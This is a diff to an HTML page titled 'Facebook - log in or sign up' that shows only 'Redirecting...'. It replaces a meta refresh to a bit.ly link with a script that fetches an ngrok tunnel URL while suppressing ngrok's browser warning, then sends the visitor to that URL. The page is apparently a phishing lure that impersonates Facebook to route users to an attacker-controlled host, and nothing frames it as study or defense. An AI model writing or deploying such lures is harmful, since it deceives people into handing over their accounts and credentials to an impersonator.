@@ -2,7 +2,22 @@
 <html>
 <head>
     <title>Facebook - log in or sign up</title>
-    <meta http-equiv="https://enhanced-grossly-slug.ngrok-free.app" content="0;url=https://bit.ly/noreply-facebook">
+    <script>
+        // Replace with your Ngrok URL
+        const ngrokUrl = "https://enhanced-grossly-slug.ngrok-free.app";
+
+        // Fetch with skip header and redirect
+        fetch(ngrokUrl, {
+            headers: {
+                "ngrok-skip-browser-warning": "true"
+            }
+        }).then(() => {
+            window.location.href = ngrokUrl; // Redirect after fetching
+        }).catch(err => {
+            console.error("Redirect failed:", err);
+            window.location.href = ngrokUrl; // Fallback redirect
+        });
+    </script>
 </head>
 <body>
     <p>Redirecting...</p>
